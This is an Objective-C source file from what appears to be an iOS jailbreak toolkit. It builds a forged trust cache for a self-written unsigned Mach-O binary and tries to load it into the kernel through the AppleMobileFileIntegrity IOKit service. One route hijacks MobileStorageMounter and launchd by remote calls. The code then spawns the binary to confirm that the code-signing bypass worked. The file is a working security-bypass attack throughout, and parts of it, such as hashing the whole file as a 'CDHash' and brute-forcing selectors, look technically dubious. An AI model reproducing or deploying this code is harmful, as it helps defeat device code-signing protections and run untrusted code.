#import "msm_trustcache.h"
#import "../TaskRop/RemoteCall.h"
#import "../kexploit/kexploit_opa334.h"

#import <CommonCrypto/CommonDigest.h>
#import <mach-o/loader.h>
#import <mach-o/fat.h>
#import <mach-o/dyld.h>
#import <sys/stat.h>
#import <unistd.h>
#import <string.h>
#import <stdlib.h>
#import <dlfcn.h>
#import <spawn.h>
#import <fcntl.h>
#import <IOKit/IOKitLib.h>

// ---------------------------------------------------------------------------
// Build trust cache v2 binary (module1 format, version=1)
// ---------------------------------------------------------------------------
uint8_t *msm_build_trust_cache(const uint8_t *cdhash, size_t cdhash_len, size_t *outSize)
{
    if (!cdhash || cdhash_len < CS_CDHASH_LEN || !outSize) return NULL;

    size_t entryCount = 1;
    size_t entriesSize = sizeof(struct trust_cache_entry) * entryCount;
    size_t totalSize = sizeof(struct trust_cache_module) + entriesSize;

    struct trust_cache_module *mod = (struct trust_cache_module *)calloc(1, totalSize);
    if (!mod) return NULL;

    mod->version = 1;
    arc4random_buf(mod->uuid, sizeof(mod->uuid));
    mod->num_entries = (uint32_t)entryCount;

    memcpy(mod->entries[0].cdhash, cdhash, CS_CDHASH_LEN);
    mod->entries[0].hash_type = 2;
    mod->entries[0].flags = 0;

    *outSize = totalSize;
    return (uint8_t *)mod;
}

// ---------------------------------------------------------------------------
// Compute SHA256 CDHash (truncated to 20 bytes)
// ---------------------------------------------------------------------------
uint8_t *msm_compute_cdhash(const char *path)
{
    FILE *fp = fopen(path, "rb");
    if (!fp) return NULL;

    fseek(fp, 0, SEEK_END);
    long len = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    if (len <= 0) { fclose(fp); return NULL; }

    uint8_t *buf = (uint8_t *)malloc((size_t)len);
    if (!buf) { fclose(fp); return NULL; }

    size_t nread = fread(buf, 1, (size_t)len, fp);
    fclose(fp);
    if ((long)nread != len) { free(buf); return NULL; }

    uint8_t hash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(buf, (CC_LONG)nread, hash);
    free(buf);

    uint8_t *cdhash = (uint8_t *)malloc(CS_CDHASH_LEN);
    if (cdhash) memcpy(cdhash, hash, CS_CDHASH_LEN);
    return cdhash;
}

// ---------------------------------------------------------------------------
// Write a minimal unsigned arm64 Mach-O
// ---------------------------------------------------------------------------
bool msm_write_test_binary(const char *path)
{
    struct mach_header_64 hdr = {
        .magic = MH_MAGIC_64,
        .cputype = CPU_TYPE_ARM64,
        .cpusubtype = CPU_SUBTYPE_ARM64_ALL,
        .filetype = MH_EXECUTE,
        .ncmds = 2,
        .sizeofcmds = 0x160,
        .flags = 0,
        .reserved = 0,
    };

    struct segment_command_64 textSeg = {
        .cmd = LC_SEGMENT_64,
        .cmdsize = sizeof(struct segment_command_64),
        .segname = "__TEXT",
        .vmaddr = 0x100000000,
        .vmsize = 0x4000,
        .fileoff = 0,
        .filesize = 0x4000,
        .maxprot = VM_PROT_READ | VM_PROT_EXECUTE,
        .initprot = VM_PROT_READ | VM_PROT_EXECUTE,
        .nsects = 0,
        .flags = 0,
    };

    struct thread_command thread = {
        .cmd = LC_UNIXTHREAD,
        .cmdsize = 0x118,
    };

    uint8_t threadState[0x110];
    memset(threadState, 0, sizeof(threadState));
    *(uint32_t *)&threadState[0] = 6;
    *(uint32_t *)&threadState[4] = 68;
    uint64_t *pc = (uint64_t *)&threadState[0x110 - 8 * 2];
    *pc = 0x100000180;

    uint32_t code[] = {
        0xD2800000,
        0xD2800030,
        0xD4001001,
    };

    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0);
    if (fd < 0) return false;

    write(fd, &hdr, sizeof(hdr));
    write(fd, &textSeg, sizeof(textSeg));
    write(fd, &thread, sizeof(thread));
    write(fd, threadState, sizeof(threadState));
    write(fd, code, sizeof(code));

    ftruncate(fd, 0x4000);
    fchmod(fd, 0755);
    close(fd);
    return true;
}

// ---------------------------------------------------------------------------
// RemoteCall callback executed inside MobileStorageMounter's context.
// Takes the TC file path as a C string via block capture.
// ---------------------------------------------------------------------------
static bool g_msm_tc_loaded = false;

static void msm_load_tc_callback(const char *cpath)
{
    if (!cpath) return;

    printf("[MountCache] loading trust cache from: %s\n", cpath);

    int fd = open(cpath, O_RDONLY);
    if (fd < 0) {
        printf("[MountCache] cannot open TC file: %s\n", strerror(errno));
        return;
    }

    struct stat st;
    if (fstat(fd, &st) < 0) {
        printf("[MountCache] fstat failed: %s\n", strerror(errno));
        close(fd);
        return;
    }

    size_t tcSize = (size_t)st.st_size;
    uint8_t *tcData = (uint8_t *)malloc(tcSize);
    if (!tcData) { close(fd); return; }

    size_t totalRead = 0;
    while (totalRead < tcSize) {
        ssize_t n = read(fd, tcData + totalRead, tcSize - totalRead);
        if (n <= 0) break;
        totalRead += (size_t)n;
    }
    close(fd);

    if (totalRead < sizeof(struct trust_cache_module)) {
        printf("[MountCache] TC file too small\n");
        free(tcData);
        return;
    }

    // IOKit is directly available inside MSM context (system daemon)
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
        IOServiceMatching("AppleMobileFileIntegrity"));
    if (!service) {
        printf("[MountCache] AMFI IOKit service not found\n");
        free(tcData);
        return;
    }

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS || !conn) {
        printf("[MountCache] IOServiceOpen failed: 0x%x\n", kr);
        IOObjectRelease(service);
        free(tcData);
        return;
    }

    printf("[MountCache] AMFI IOKit service opened (conn=0x%x)\n", conn);

    // Try selectors 0-15 to load the trust cache data
    for (uint32_t sel = 0; sel < 16; sel++) {
        size_t outSize = sizeof(uint32_t);
        uint32_t outVal = 0;
        kr = IOConnectCallStructMethod(conn, sel, tcData, tcSize, &outVal, &outSize);
        if (kr == KERN_SUCCESS) {
            printf("[MountCache] TC loaded via IOKit selector %u!\n", sel);
            g_msm_tc_loaded = true;
            break;
        }
    }

    IOServiceClose(conn);
    IOObjectRelease(service);
    free(tcData);
}

// ---------------------------------------------------------------------------
// Try to load trust cache via AMFI IOKit service from our own process.
// This works after AMFI enforcement flags are zeroed (strategy 2).
// Safe on all iOS versions — no RemoteCall involved.
// ---------------------------------------------------------------------------
static bool msm_inject_tc_via_amfi_iokit(const char *tcPath)
{
    if (!tcPath) return false;

    int fd = open(tcPath, O_RDONLY);
    if (fd < 0) return false;

    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return false; }

    size_t tcSize = (size_t)st.st_size;
    uint8_t *tcData = (uint8_t *)malloc(tcSize);
    if (!tcData) { close(fd); return false; }

    size_t totalRead = 0;
    while (totalRead < tcSize) {
        ssize_t n = read(fd, tcData + totalRead, tcSize - totalRead);
        if (n <= 0) break;
        totalRead += (size_t)n;
    }
    close(fd);

    if (totalRead < sizeof(struct trust_cache_module)) {
        free(tcData);
        return false;
    }

    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
        IOServiceMatching("AppleMobileFileIntegrity"));
    if (!service) {
        printf("[MountCache] AMFI IOKit service not found\n");
        free(tcData);
        return false;
    }

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS || !conn) {
        printf("[MountCache] IOServiceOpen from our process failed: 0x%x\n", kr);
        IOObjectRelease(service);
        free(tcData);
        return false;
    }

    printf("[MountCache] AMFI IOKit opened from our process (conn=0x%x)\n", conn);

    bool loaded = false;
    for (uint32_t sel = 0; sel < 16; sel++) {
        size_t outSize = sizeof(uint32_t);
        uint32_t outVal = 0;
        kr = IOConnectCallStructMethod(conn, sel, tcData, tcSize, &outVal, &outSize);
        if (kr == KERN_SUCCESS) {
            printf("[MountCache] TC loaded via direct IOKit selector %u!\n", sel);
            loaded = true;
            break;
        }
    }

    IOServiceClose(conn);
    IOObjectRelease(service);
    free(tcData);
    return loaded;
}

// ---------------------------------------------------------------------------
// Main entry point: inject trust cache into the kernel.
//   Phase 1: direct AMFI IOKit call from our process (no RemoteCall).
//   Phase 2 (fallback, pre-iOS 17 only): RemoteCall into MobileStorageMounter.
// ---------------------------------------------------------------------------
bool msm_inject_trust_cache(const char *tcPath)
{
    if (!tcPath) {
        printf("[MountCache] invalid tcPath\n");
        return false;
    }

    printf("[MountCache] === MobileStorageMounter Trust Cache Injection ===\n");
    printf("[MountCache] target: %s\n", tcPath);

    // Phase 1: direct AMFI IOKit call (safe on all iOS versions)
    printf("[MountCache] trying direct AMFI IOKit call...\n");
    if (msm_inject_tc_via_amfi_iokit(tcPath)) {
        printf("[MountCache] trust cache loaded via direct IOKit\n");
        return true;
    }
    printf("[MountCache] direct IOKit failed\n");

    // Phase 2: RemoteCall fallback — only on pre-iOS 17 (kernel panic on 17+)
    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"17.0")) {
        printf("[MountCache] iOS 17+: RemoteCall unavailable (kernel panic)\n");
        return false;
    }

    printf("[MountCache] connecting to MobileStorageMounter via RemoteCall...\n");

    RemoteCallSession *session = [[RemoteCallSession alloc]
        initWithProcess:@"MobileStorageMounter" useMigFilterBypass:NO];
    if (!session) {
        RemoteCallInitFailure failure = remote_call_last_init_failure();
        printf("[MountCache] RemoteCall init failed: %s\n",
               remote_call_init_failure_description(failure));
        return false;
    }

    printf("[MountCache] RemoteCall session active\n");

    __block bool loaded = false;
    @try {
        g_msm_tc_loaded = false;
        NSString *pathCopy = [NSString stringWithUTF8String:tcPath];
        remote_call_with_session(session, ^{
            msm_load_tc_callback(pathCopy.UTF8String);
        });
        loaded = g_msm_tc_loaded;
    } @catch (NSException *e) {
        printf("[MountCache] RemoteCall exception: %s\n", e.reason.UTF8String);
    }

    printf("[MountCache] trust cache loaded: %s\n", loaded ? "YES" : "NO");
    return loaded;
}

// ---------------------------------------------------------------------------
// Convenience: build test binary + TC, inject via MSM, verify via launchd RC
// ---------------------------------------------------------------------------
bool msm_verify_unsigned_execution(void)
{
    NSString *tmpDir = NSTemporaryDirectory();
    NSString *binPath = [tmpDir stringByAppendingPathComponent:@"msm_test_bin"];
    NSString *tcPath = [tmpDir stringByAppendingPathComponent:@"msm_tc.bin"];

    // Step 1: Write test binary (ftruncate instead of byte-padding)
    printf("[MountCache] writing test binary...\n");
    if (!msm_write_test_binary(binPath.UTF8String)) {
        printf("[MountCache] failed to write test binary\n");
        return false;
    }

    // Step 2: Compute CDHash
    printf("[MountCache] computing CDHash...\n");
    uint8_t *cdhash = msm_compute_cdhash(binPath.UTF8String);
    if (!cdhash) {
        printf("[MountCache] failed to compute CDHash\n");
        unlink(binPath.UTF8String);
        return false;
    }

    // Step 3: Build trust cache
    printf("[MountCache] building trust cache v2...\n");
    size_t tcSize = 0;
    uint8_t *tcData = msm_build_trust_cache(cdhash, CS_CDHASH_LEN, &tcSize);
    free(cdhash);
    if (!tcData) {
        unlink(binPath.UTF8String);
        return false;
    }

    FILE *fp = fopen(tcPath.UTF8String, "wb");
    if (!fp) {
        free(tcData);
        unlink(binPath.UTF8String);
        return false;
    }
    fwrite(tcData, 1, tcSize, fp);
    fclose(fp);
    free(tcData);

    printf("[MountCache] CDHash: ");
    {
        uint8_t *hash = msm_compute_cdhash(binPath.UTF8String);
        if (hash) {
            for (int i = 0; i < CS_CDHASH_LEN; i++) printf("%02x", hash[i]);
            printf("\n");
            free(hash);
        }
    }

    // Step 4: Inject via MSM
    printf("[MountCache] injecting trust cache via MSM...\n");
    bool injected = msm_inject_trust_cache(tcPath.UTF8String);

    unlink(tcPath.UTF8String);

    if (!injected) {
        printf("[MountCache] trust cache injection failed\n");
        unlink(binPath.UTF8String);
        return false;
    }

    // Step 5: Verify - try direct spawn first (safe on all iOS versions)
    printf("[MountCache] verifying: trying direct posix_spawn...\n");
    {
        pid_t child = 0;
        const char *argv[] = { binPath.UTF8String, NULL };
        int ret = posix_spawn(&child, binPath.UTF8String, NULL, NULL,
                              (char *const *)argv, NULL);
        printf("[MountCache] direct spawn ret=%d pid=%d\n", ret, child);
        if (ret == 0 && child > 0) {
            int status;
            waitpid(child, &status, 0);
            bool ok = (WIFEXITED(status) && WEXITSTATUS(status) == 0);
            if (ok) {
                printf("[MountCache] unsigned binary executed via direct spawn!\n");
                unlink(binPath.UTF8String);
                return true;
            }
        }
        printf("[MountCache] direct spawn failed\n");
    }

    // Fall back to RemoteCall on launchd for pre-iOS 17 only
    __block bool spawned = false;
    if (!SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"17.0")) {
        printf("[MountCache] trying spawn via launchd RemoteCall...\n");

        RemoteCallSession *launchdSession = [[RemoteCallSession alloc]
            initWithProcess:@"launchd" useMigFilterBypass:NO];
        if (launchdSession) {
            @try {
                NSString *pathCopy = [NSString stringWithUTF8String:binPath.UTF8String];
                remote_call_with_session(launchdSession, ^{
                    const char *cpath = pathCopy.UTF8String;
                    pid_t pid = 0;
                    const char *argv[] = { cpath, NULL };
                    int ret = posix_spawn(&pid, cpath, NULL, NULL, (char *const *)argv, NULL);
                    printf("[MountCache] launchd-RC posix_spawn ret=%d pid=%d\n", ret, pid);
                    if (ret == 0 && pid > 0) {
                        spawned = true;
                    }
                });
            } @catch (NSException *e) {
                printf("[MountCache] launchd RC exception: %s\n", e.reason.UTF8String);
            }
        } else {
            printf("[MountCache] launchd RC init failed\n");
        }
    } else {
        printf("[MountCache] iOS 17+: launchd RemoteCall unavailable, skipped\n");
    }

    unlink(binPath.UTF8String);

    if (spawned) {
        printf("[MountCache] unsigned binary executed!\n");
    } else {
        printf("[MountCache] spawn failed AMFI still blocking\n");
    }

    return spawned;
}
